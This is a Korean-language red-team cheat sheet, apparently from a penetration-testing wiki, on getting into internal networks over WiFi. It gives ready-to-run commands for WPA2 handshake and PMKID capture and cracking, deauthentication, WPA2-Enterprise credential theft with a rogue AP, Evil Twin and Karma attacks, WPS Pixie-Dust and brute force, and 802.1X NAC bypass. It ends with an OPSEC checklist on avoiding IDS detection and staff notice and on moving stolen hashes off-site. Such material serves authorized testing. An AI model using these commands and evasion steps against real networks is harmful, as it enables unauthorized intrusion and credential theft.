# Wireless / WiFi

물리 침투나 주차장 / guest AP 를 통해 내부망으로 진입할 때의 벡터.
WPA2-PSK, WPA2-Enterprise (EAP), WPS, Evil Twin, Karma 정도가 기본 라인업.

---

## 준비

| 장비 | 용도 |
|---|---|
| Alfa AWUS036ACH / AWUS036NHA | monitor mode + packet injection |
| Panda PAU09 | 2.4GHz 안정적 |
| WiFi Pineapple Mark VII | Rogue AP / Karma 자동화 |

```bash
# monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 주변 AP 스캔
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

---

## WPA2-PSK cracking

### 4-way Handshake capture

```bash
# 1. target AP 채널 고정 + capture
airodump-ng -c 6 --bssid <BSSID> -w handshake wlan0mon

# 2. client 에 deauth 쏴서 재 handshake 유도
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# 3. cracking. hashcat 22000 권장
hcxpcapngtool -o hash.22000 handshake.cap
hashcat -m 22000 hash.22000 rockyou.txt
```

### PMKID (client 없어도 됨)

```bash
# deauth 없이 AP 혼자서도 수집 가능 → OPSEC 우수
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.22000 pmkid.pcapng
hashcat -m 22000 hash.22000 wordlist.txt
```

---

## WPA2-Enterprise (EAP)

기업 환경에서 제일 흔한 방식. Radius 가 EAP-PEAP / EAP-TTLS / EAP-TLS 로 인증.

```bash
# Rogue AP 로 EAP 요청 중계 → Radius hash 탈취
# hostapd-wpe (Wireless Pwnage Edition)
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
hostapd-wpe hostapd-wpe.conf

# capture된 건 NetNTLMv1/v2 유사 포맷 (MSCHAPv2 challenge/response)
# → asleap 또는 hashcat -m 5500
asleap -C <challenge> -R <response> -W rockyou.txt
```

!!! tip "EAP-TLS"
    EAP-TLS 는 client 인증서 기반이라 hostapd-wpe 로 credential 을 못 얻는다. 다만 client 가 "Validate server certificate" 를 끄고 있으면 rogue AP 에서 EAP-TTLS 로 downgrade 유도 가능.

---

## Evil Twin / Karma

```bash
# 동일 SSID 로 더 강한 신호의 가짜 AP.
# 정품 AP 는 deauth 로 밀어내고 → 피해자가 자동으로 공격자 AP 에 붙음
airgeddon       # 메뉴 기반 자동화
wifipumpkin3    # Python 기반 Rogue AP + captive portal

# Karma: client 의 probe request (Preferred Network List) 를 그대로 응답
# → "Starbucks_WiFi" 같은 개방 SSID 를 자동으로 제공
```

---

## WPS (구형 가정용 AP)

```bash
# WPS 활성 AP 스캔
wash -i wlan0mon

# Pixie-Dust (offline, 수 초 ~ 몇 분)
reaver -i wlan0mon -b <BSSID> -K 1 -vv

# Online bruteforce (lockout 주의)
reaver -i wlan0mon -b <BSSID> -vv
bully -b <BSSID> wlan0mon
```

---

## 802.1X NAC 우회 (유선 / 무선 포트 보안)

```bash
# silent-bridge / nac_bypass : 정상 기기의 MAC / 인증서를 bridge 로 흘려보내서 네트워크 진입

# 유선 NAC 우회
git clone https://github.com/scipag/nac_bypass
./nac_bypass_setup.sh -1 eth0 -2 eth1
# eth0 = target 포트, eth1 = 이미 인증된 기기
```

---

## OPSEC checklist

- [ ] 공격용 디바이스 MAC 랜덤화 (`macchanger -r wlan0`)
- [ ] Deauth 는 최소한만. 대량 packet은 IDS 가 바로 잡는다
- [ ] Rogue AP 신호세기는 정품과 비슷하게. 너무 세면 직원이 눈치챈다
- [ ] capture한 hash / credential 은 바로 off-site 반출
- [ ] cracking은 공격자 VPS 에서. target 와이파이 앞에서 돌리지 말 것

---

## 참고

- 내부망 진입 뒤: [Enumeration](../lifecycle/enumeration.md), [Lateral Movement](../lifecycle/lateral-movement.md)
- Credential 처리: [Credential Access](../lifecycle/credential-access.md)
